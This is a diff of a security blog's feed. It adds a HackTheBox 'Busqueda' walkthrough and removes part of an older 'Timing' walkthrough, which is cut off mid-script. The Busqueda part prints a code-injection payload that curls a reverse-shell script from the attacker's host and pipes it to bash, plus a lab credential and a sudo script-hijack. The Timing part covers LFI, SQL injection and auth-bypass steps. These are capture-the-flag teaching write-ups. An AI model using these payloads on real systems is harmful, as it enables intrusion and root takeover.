@@ -1,4 +1,236 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-05T16:36:21+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Agile - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/agile.html" rel="alternate" type="text/html" title="Agile - HackTheBox" /><published>2023-08-05T00:00:00+01:00</published><updated>2023-08-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/agile</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/agile.html"><![CDATA[<p><strong>Agile</strong> is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the <em>Werkzeug</em> debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit <code class="language-plaintext highlighter-rouge">sudoedit</code> and a cron job that uses python’s virtualenv to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-12T18:31:43+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Busqueda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/busqueda.html" rel="alternate" type="text/html" title="Busqueda - HackTheBox" /><published>2023-08-12T00:00:00+01:00</published><updated>2023-08-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/busqueda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/busqueda.html"><![CDATA[<p><strong>Busqueda</strong> is a nice easy linux machine on <em>HackTheBox</em>. It starts with a web application that’s vulnerable to <em>RCE</em>. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a <em>Gitea</em> instance. Privesc is by exploiting a custom script with sudo perms.</p>
+
+<p><br /></p>
+
+<h3 id="about">About</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/Pasted image 20230812065633.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230812065716.png" alt="" /></p>
+
+<p><br /></p>
+
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+<p><br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Mon Jul 31 06:51:57 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.208
+Increasing send delay for 10.10.11.208 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
+Increasing send delay for 10.10.11.208 from 10 to 20 due to 11 out of 18 dropped probes since last increase.
+Increasing send delay for 10.10.11.208 from 20 to 40 due to 11 out of 15 dropped probes since last increase.
+Nmap scan report for 10.10.11.208
+Host is up (0.50s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 31 06:53:07 2023 -- 1 IP address (1 host up) scanned in 70.24 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+<p><br /></p>
+
+<p>Server redirects to <code class="language-plaintext highlighter-rouge">searcher.htb</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230812071854.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230812072012.png" alt="" /></p>
+
+<p>Site is running <em>Searchor v2.4.0</em>, which is available on <a href="https://github.com/ArjunSharda/Searchor">GitHub</a></p>
+
+<p><img src="/assets/img/Pasted image 20230812072417.png" alt="" /></p>
+
+<p>Entering a simple search term returns a link;</p>
+
+<p><img src="/assets/img/Pasted image 20230812072919.png" alt="" /></p>
+
+<p>The request made;</p>
+
+<p><img src="/assets/img/Pasted image 20230812073004.png" alt="" /></p>
+
+<p>When testing the <code class="language-plaintext highlighter-rouge">query</code> parameter, the endpoint is behaving differently whenever a single quote <code class="language-plaintext highlighter-rouge">'</code> is entered;</p>
+
+<p><img src="/assets/img/Pasted image 20230812073232.png" alt="" /></p>
+
+<p>Suspected SQL injection, but none of the usual payloads seems to work. I installed <em>Seachor</em> locally for testing;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.tar.gz
+<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> v2.4.0.tar.gz
+<span class="nv">$ </span><span class="nb">cd </span>Searchor-2.4.0
+<span class="nv">$ </span><span class="nb">sudo </span>python3 setup.py <span class="nb">install</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The README shows how the program is used. It has a module you can import and use in python, and also a CLI version. The module seems to handle single quotes well when called from a python REPL;</p>
+
+<p><img src="/assets/img/Pasted image 20230812074023.png" alt="" /></p>
+
+<p>However, the CLI tool provided gave an error;</p>
+
+<p><img src="/assets/img/Pasted image 20230812074204.png" alt="" /></p>
+
+<p>Notice how the <code class="language-plaintext highlighter-rouge">'</code> in the call to <code class="language-plaintext highlighter-rouge">Engine.Accuweather.Search</code> is not balanced, and we were able to escape the quotation. This indicates our query is injected directly into a python code used to call the library. Testing this, we got code execution;</p>
+
+<p><img src="/assets/img/Pasted image 20230812074648.png" alt="" /></p>
+
+<p>Testing on the box, I was unable to execute a bash rev shell directly. Had to curl it from my box, but it worked, and I got in as the user <code class="language-plaintext highlighter-rouge">svc</code>;</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>engine=Accuweather&amp;query=',exec("import os; os.system('curl 10.10.16.10/rev.sh | /bin/bash')"),'
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/Pasted image 20230812075857.png" alt="" /></p>
+
+<p>User flag was found in <code class="language-plaintext highlighter-rouge">~/user.txt</code></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>Can’t check sudo perms for <code class="language-plaintext highlighter-rouge">svc</code> as we still don’t have his password. <code class="language-plaintext highlighter-rouge">.gitconfig</code> file was found in the home directory, which is what is used to configure <code class="language-plaintext highlighter-rouge">git</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230812080610.png" alt="" /></p>
+
+<p>Checking the web app root dir at <code class="language-plaintext highlighter-rouge">/var/www/app</code> showed a <code class="language-plaintext highlighter-rouge">.git</code> folder, indicating it’s a GIT repo. Running <code class="language-plaintext highlighter-rouge">git status</code> prompted us to add the directory as <em>safe</em> for git;</p>
+
+<p><img src="/assets/img/Pasted image 20230812081017.png" alt="" /></p>
+
+<p>Notice from the output above the repo is in sync with <code class="language-plaintext highlighter-rouge">origin/main</code>, which indicates an upstream has been configured. Listing the remote origins, a cred was revealed;</p>
+
+<p><img src="/assets/img/Pasted image 20230812081319.png" alt="" /></p>
+
+<p>This is the same username that was found in <code class="language-plaintext highlighter-rouge">/home/svc/.gitconfig</code>. Testing the password on the account, I was able to login over SSH. <code class="language-plaintext highlighter-rouge">sudo -l</code> reveals a sudo perm on a custom script;</p>
+
+<p><img src="/assets/img/Pasted image 20230812081749.png" alt="" /></p>
+
+<p>However I do not have read perms on the file;</p>
+
+<p><img src="/assets/img/Pasted image 20230812081836.png" alt="" /></p>
+
+<p>Further enum showed a local <em>apache2</em> VHOST in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230812082355.png" alt="" /></p>
+
+<p>I setup an SSH tunnel to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code>, and was able to access it through my browser;</p>
+
+<p><img src="/assets/img/Pasted image 20230812082507.png" alt="" /></p>
+
+<p>We already have the password of the <code class="language-plaintext highlighter-rouge">svc</code> user. Trying it on the Gitea instance didn’t work. But earlier we saw <code class="language-plaintext highlighter-rouge">svc</code> using the name <code class="language-plaintext highlighter-rouge">cody</code> in <code class="language-plaintext highlighter-rouge">.gitconfig</code>. Trying <code class="language-plaintext highlighter-rouge">cody:jh1usoih2bkjaspwe92</code> allowed me to login;</p>
+
+<p><img src="/assets/img/Pasted image 20230812082917.png" alt="" /></p>
+
+<p>Nothing of interest was found, except for the admin user;</p>
+
+<p><img src="/assets/img/Pasted image 20230812082820.png" alt="" /></p>
+
+<p>Going back to the sudo script, it accepts 3 arguments;</p>
+
+<p><img src="/assets/img/Pasted image 20230812083106.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">docker-ps</code> showed 2 docker containers running;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 29 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 29 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">docker-inspect</code> allows us to supply a <em>format</em> and <em>container</em> name. This is interesting because docker has an <code class="language-plaintext highlighter-rouge">inspect</code> command used to pull info from containers if we can supply a custom Go template;</p>
+
+<p><img src="/assets/img/Pasted image 20230812083759.png" alt="" /></p>
+
+<p>Trying a template that will print the docker configuration of a container worked, and we got a new MySQL cred;</p>
+
+<p><img src="/assets/img/Pasted image 20230812083954.png" alt="" /></p>
+
+<p>Remember <code class="language-plaintext highlighter-rouge">docker-ps</code> showed port <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) is forwarded to the <code class="language-plaintext highlighter-rouge">mysql_db</code> container on the box. Was able to login successfully and get the hash of <code class="language-plaintext highlighter-rouge">administrator</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230812084621.png" alt="" /></p>
+
+<p>No need to crack this though as the password used for the Gitea MySQL database is also the password of the user <code class="language-plaintext highlighter-rouge">administrator</code>, and we now have access to a repo containing the source code of the sudo scripts;</p>
+
+<p><img src="/assets/img/Pasted image 20230812085220.png" alt="" /></p>
+
+<p>Going through the source code of <code class="language-plaintext highlighter-rouge">system-checkup.py</code>, the script is calling <code class="language-plaintext highlighter-rouge">run_command()</code> with a relative path;</p>
+
+<p><img src="/assets/img/Pasted image 20230812085520.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230812085542.png" alt="" /></p>
+
+<p>This makes the script vulnerable to arbitrary code execution as we could simply create a file in our current directory named <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> and it wil be executed;</p>
+
+<p><img src="/assets/img/Pasted image 20230812090108.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230812090253.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap</code> found port 22 (OpenSSH) and 80 (Apache2)</li>
+  <li>Werkzeug web app that uses <code class="language-plaintext highlighter-rouge">Searchor v2.4.0</code> to run searches
+    <ul>
+      <li>Exploited an RCE bug to gain a shell as <code class="language-plaintext highlighter-rouge">svc</code></li>
+    </ul>
+  </li>
+  <li>Inside as <code class="language-plaintext highlighter-rouge">svc</code>;
+    <ul>
+      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
+      <li><code class="language-plaintext highlighter-rouge">sudo</code> perms configured, but no read access to the script.</li>
+      <li>Found a cred for a git remote origin.</li>
+      <li>Password was reused by user <code class="language-plaintext highlighter-rouge">cody</code> on local Gitea instance.</li>
+      <li>Pulled Gitea <code class="language-plaintext highlighter-rouge">adminstrator</code> creds from docker config;
+        <ul>
+          <li>Found source code of the <code class="language-plaintext highlighter-rouge">sudo</code> script.</li>
+          <li>Identified a relative call to a local script.</li>
+          <li>Hijacked it to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="python" /><category term="werkzeug" /><category term="apache" /><category term="tunnel" /><category term="searchor" /><category term="gitea" /><category term="docker" /><category term="docker-inspect" /><summary type="html"><![CDATA[Busqueda is a nice easy linux machine on HackTheBox. It starts with a web application that’s vulnerable to RCE. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a Gitea instance. Privesc is by exploiting a custom script with sudo perms.]]></summary></entry><entry><title type="html">Agile - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/agile.html" rel="alternate" type="text/html" title="Agile - HackTheBox" /><published>2023-08-05T00:00:00+01:00</published><updated>2023-08-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/agile</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/agile.html"><![CDATA[<p><strong>Agile</strong> is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the <em>Werkzeug</em> debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit <code class="language-plaintext highlighter-rouge">sudoedit</code> and a cron job that uses python’s virtualenv to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>
 
 <p><br /></p>
 
@@ -3980,364 +4212,4 @@ pkill mogrify
       <li>Exploited a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">neofetch</code> to gain code execution using malicious config file.</li>
     </ul>
   </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="exiftool" /><category term="imagemagick" /><category term="neofetch" /><category term="sudo" /><summary type="html"><![CDATA[Meta is a pretty easy medium-rated box on HackTheBox. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an exiftool CVE. User access is also another CVE targeting ImageMagick, and privesc to root is through a vulnerable sudo configuration on neofetch, which allows you to hijack the configuration file used by the program.]]></summary></entry><entry><title type="html">Timing - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/timing.html" rel="alternate" type="text/html" title="Timing - HackTheBox" /><published>2022-06-04T00:00:00+01:00</published><updated>2022-06-04T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/timing</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/timing.html"><![CDATA[<p><strong>Timing</strong> is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.</p>
-
-<p><br /></p>
-
-<h3 id="info">Info</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20220209224109.png" alt="" /></p>
-
-<p><img src="/assets/img/20220209224127.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Dec 14 10:59:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.135
-Nmap scan report for timing.htb (10.10.11.135)
-Host is up (0.22s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
-|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
-|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-| http-title: Simple WebApp
-|_Requested resource was ./login.php
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Dec 14 11:00:44 2021 -- 1 IP address (1 host up) scanned in 48.55 seconds
-</code></pre>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-
-<p><img src="/assets/img/20220209224325.png" alt="" /></p>
-
-<p>The login form is submitted via a simple POST request with two parameters;</p>
-
-<p><img src="/assets/img/20220209224513.png" alt="" /></p>
-
-<p>After playing around with it, I noticed a significant delay when sending a login request with the username <strong>admin</strong> than with any other username. This indicate the username <strong>admin</strong> may be valid, and the delay could be used to enumerate valid users.</p>
-
-<p>Knowing that this is a PHP website, I started bruteforcing the web root for hidden files using <code class="language-plaintext highlighter-rouge">ffuf</code>, and found a few that look interesting;</p>
-
-<p><img src="/assets/img/20220209224937.png" alt="" /></p>
-
-<p>Most are login protected, except <code class="language-plaintext highlighter-rouge">/image.php</code>, which gave a <strong>200</strong> response with empty body. I started fuzzing it for parameters, and caught a break after a few requests because I got a non-empty response;</p>
-
-<p><img src="/assets/img/20220209225332.png" alt="" /></p>
-
-<p>Doing the request in burp, I got the following message;</p>
-
-<p><img src="/assets/img/20220209225512.png" alt="" /></p>
-
-<p>After a few tests, I understood the parameter is used to read local files, presumably images. The <code class="language-plaintext highlighter-rouge">file://</code> protocol is blocked by the web app, but the filter does not consider the fact that URL protocols in many cases are case-insensitive, meaning <code class="language-plaintext highlighter-rouge">file://</code> and <code class="language-plaintext highlighter-rouge">FILE://</code> are all valid. This allowed me to bypass the filter by changing the protocol to uppercase. The page is <strong>vulnerable</strong> to LFI.</p>
-
-<p><img src="/assets/img/20220209230029.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="foothold">Foothold</h3>
-<p><br /></p>
-
-<h4 id="source-code-analysis">Source Code Analysis</h4>
-<p><br /></p>
-
-<p>With the LFI vuln identified, I began to enumerate the source code of the web application in hope of finding something. Checking the default Apache2 configuration file at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/000-default.conf</code> showed that the web root is at <code class="language-plaintext highlighter-rouge">/var/www/html</code>. Attempting to view the source code of the <code class="language-plaintext highlighter-rouge">index.php</code> file using the LFI returned a <strong>302</strong> redirect to the login page;</p>
-
-<p><img src="/assets/img/20220209230531.png" alt="" /></p>
-
-<p>This indicate the server is executing the included file via the LFI as a PHP code, which means I can gain <em>arbitrary code execution</em> if I can write to file on the server. But I have no way to do so at the moment, so I continued to look for ways to read PHP code without executing it. The method that worked was using the <code class="language-plaintext highlighter-rouge">php://</code> protocol, which have a filter that can be used to read a file as a base64 encoded string;</p>
-
-<p><img src="/assets/img/20220209231009.png" alt="" /></p>
-
-<p>I used this approach to dump a couple of PHP files I have discovered either through bruteforce, or code analysis.</p>
-
-<p>With interesting PHP files downloaded, I began to analyse them for something I could exploit. I discovered that the file that checks if a user is authenticated has a broken logic, which can be exploited to access restricted pages that do not perform explicit user validation. Take a look at the below code;</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
-
-<span class="c1">//ini_set('display_errors', '1');</span>
-<span class="c1">//ini_set('display_startup_errors', '1');</span>
-<span class="c1">//error_reporting(E_ALL);</span>
-
-<span class="c1">// session is valid for 1 hour</span>
-<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.gc_maxlifetime'</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
-<span class="nb">session_set_cookie_params</span><span class="p">(</span><span class="mi">3600</span><span class="p">);</span>
-
-<span class="nb">session_start</span><span class="p">();</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">],</span> <span class="s2">"login.php"</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ./login.php'</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span>
-
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The <code class="language-plaintext highlighter-rouge">if</code> condition checks if there is <em>no</em> session variable named <code class="language-plaintext highlighter-rouge">userid</code>, and whether the requested URL <em>does not</em> contain the string <code class="language-plaintext highlighter-rouge">login.php</code>. If this two conditions are satisfied, user is redirected to the login page. This is a broken logic because if any of the conditions were not satisfied, the user will be asumed to be logged in.</p>
-
-<p>Although we can’t control the first check that uses session variable, we can control the second one as the validation is performed on a URL we provided, and all we have to do is make sure it contains the string <code class="language-plaintext highlighter-rouge">login.php</code>. Since the whole URL is used for validation, I was able to bypass authentication by adding a <code class="language-plaintext highlighter-rouge">GET</code> parameter to the URL with the value <code class="language-plaintext highlighter-rouge">login.php</code>;</p>
-
-<p><img src="/assets/img/20220209232637.png" alt="" /></p>
-
-<p>This still did not give me access to any other key functionality in the web app, so I continue to study the source files. I eventually caught a break because the file <code class="language-plaintext highlighter-rouge">profile_update.php</code> is clearly vulnerable to <strong>SQL injection</strong> at line <code class="language-plaintext highlighter-rouge">47</code>, which I couldn’t exploit because the page attempts to validate the user account, which will fail before the vulnerable code is executed;</p>
-
-<p><img src="/assets/img/20220209234147.png" alt="" /></p>
-
-<p>The file <code class="language-plaintext highlighter-rouge">admin_auth_check.php</code> looks like it’s being used to verify if a user is an admin using the session variable <code class="language-plaintext highlighter-rouge">role</code>, which for admins is set to <code class="language-plaintext highlighter-rouge">1</code>;</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
-  <span class="k">include_once</span> <span class="s2">"auth_check.php"</span><span class="p">;</span>
-  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'role'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">"No permission to access this panel!"</span><span class="p">;</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ./index.php'</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-  <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>This is very interesting because the <code class="language-plaintext highlighter-rouge">role</code> is saved in the backend database, which I can write to using the <em>SQL Injection</em> flaw discovered earlier. But not yet because I still have no access to a valid account.</p>
-
-<p><br /></p>
-
-<h4 id="hunting-for-valid-users">Hunting For Valid Users</h4>
-<p><br /></p>
-
-<p>At this point I have no way of moving forward that I can think of without a valid authenticated session on the website. So I continue to exploit the delay in response to enumerate valid usernames.</p>
-
-<p>Eventually, I discovered a user with the name <strong>aaron</strong>. Testing for weak passwords, I was able to login to his account using the password <strong>aaron</strong>;</p>
-
-<p><img src="/assets/img/20220209233629.png" alt="" /></p>
-
-<p>Now with a valid account on the site, I can begin to exploit the previously discovered vulnerabilities.</p>
-
-<p><br /></p>
-
-<h4 id="popping-a-shell">Popping a Shell</h4>
-<p><br /></p>
-
-<p>Going to the “Edit profile” tab, I was given a form to update my profile info, which burp showed is being sent to the PHP file that was previously found to be vulnerable to <em>SQL Injection</em>;</p>
-
-<p><img src="/assets/img/20220209233838.png" alt="" /></p>
-
-<p><img src="/assets/img/20220209233921.png" alt="" /></p>
-
-<p>A look at the <code class="language-plaintext highlighter-rouge">login.php</code> source showed that the role of a user is loaded from the column <code class="language-plaintext highlighter-rouge">role</code>. Using the SQL injection flaw, I set the role of <strong>aaron</strong> to <code class="language-plaintext highlighter-rouge">1</code>, making him an admin;</p>
-
-<p><img src="/assets/img/20220209234448.png" alt="" /></p>
-
-<p>I then logged out and logged back in, and I’m now working as an admin. This gave me access to the admin panel, and the <code class="language-plaintext highlighter-rouge">avatar_uploader.php</code> page that I can use to upload files;</p>
-
-<p><img src="/assets/img/20220209234647.png" alt="" /></p>
-
-<p>So I started analysing the source code of files involved in the upload. The code that process the uploaded file is <code class="language-plaintext highlighter-rouge">upload.php</code>, which restrict the extension of uploaded files to <code class="language-plaintext highlighter-rouge">.jpg</code> only. Uploaded files are saved in the web root at <code class="language-plaintext highlighter-rouge">images/uploads/</code>, but the filename is prefixed with a <em>seemingly</em> random token;</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre><span class="nv">$file_hash</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
-<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">'$file_hash'</span> <span class="mf">.</span> <span class="nb">time</span><span class="p">())</span> <span class="mf">.</span> <span class="s1">'_'</span> <span class="mf">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]);</span>
-<span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="mf">.</span> <span class="nv">$file_name</span><span class="p">;</span>
-<span class="nv">$error</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
-<span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="no">PATHINFO_EXTENSION</span><span class="p">));</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>The function <code class="language-plaintext highlighter-rouge">uniqid()</code> returns a 13 character long alphanumeric string based on the current system time in milliseconds. But notice that in the second line, the value is passed to the call to <code class="language-plaintext highlighter-rouge">md5()</code> as <code class="language-plaintext highlighter-rouge">'$file_hash'</code> enclosed in single quotes. In PHP, this will pass the literal string <code class="language-plaintext highlighter-rouge">$file_hash</code>, instead of the value the variable contains. This makes bruteforcing this token a lot easier since we only need to target the output of <code class="language-plaintext highlighter-rouge">time()</code>, which is the current epoch time in seconds.</p>
-
-<p>With all this info, I made a simple python script that will generate possible names an uploaded file is saved as, and used <code class="language-plaintext highlighter-rouge">ffuf</code> to locate it. I saved the below script as <code class="language-plaintext highlighter-rouge">make_paths.py</code>;</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
